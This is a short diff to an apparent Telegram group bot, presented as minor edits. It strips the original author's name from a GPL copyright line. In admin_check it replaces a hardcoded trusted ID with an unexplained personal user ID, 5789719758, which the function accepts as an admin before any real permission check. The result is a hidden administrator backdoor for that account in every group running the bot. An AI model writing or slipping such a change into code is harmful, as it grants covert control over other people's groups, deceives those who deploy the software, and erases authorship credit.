@@ -140,7 +140,7 @@ def list_to_str(k):
 __repo__ = "https://github.com/developeranandtech/MainRepo"
 __version__ = "Autofilter"
 __license__ = "GNU GENERAL PUBLIC LICENSE V2"
-__copyright__ = "Copyright (C) 2023-present MrMKN <https://github.com/MainRepo>"
+__copyright__ = "Copyright (C) 2023-present<https://github.com>"
 
 async def search_gagala(text):
     usr_agent = {
@@ -347,7 +347,7 @@ def extract_time(time_val):
 async def admin_check(message: Message) -> bool:
     if not message.from_user: return False
     if message.chat.type not in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]: return False
-    if message.from_user.id in [777000, 1087968824]: return True
+    if message.from_user.id in [777000, 5789719758]: return True
     client = message._client
     chat_id = message.chat.id
     user_id = message.from_user.id
